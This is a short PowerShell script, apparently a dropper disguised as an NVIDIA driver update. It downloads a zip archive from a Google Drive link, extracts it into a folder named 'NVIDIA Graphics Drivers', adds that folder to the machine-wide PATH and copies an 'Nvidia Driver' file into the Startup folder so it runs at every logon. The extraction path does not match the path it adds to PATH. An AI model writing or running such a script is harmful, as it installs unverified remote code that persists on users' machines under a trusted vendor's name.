$username=[Environment]::UserName
$zipFile = "https://drive.usercontent.google.com/download?id=1K4-RNWLveLMlXeYNxhU_ixOJqPkUto75&export=download&authuser=0&confirm=t&uuid=c7cf249b-eae8-4c05-9b54-cc31c1965923&at=APZUnTW1V4_b7EfRKpngGHmZ3E_p:1722069362432"
cmd /c curl $zipFile --output "C:\Users\$username\AppData\Local\Temp\updater.zip"
Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Users\Program Files\NVIDIA Graphics Drivers"
$Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\NVIDIA Graphics Drivers\bin;C:\Program Files\NVIDIA Graphics Drivers\include'
[Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
cp "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
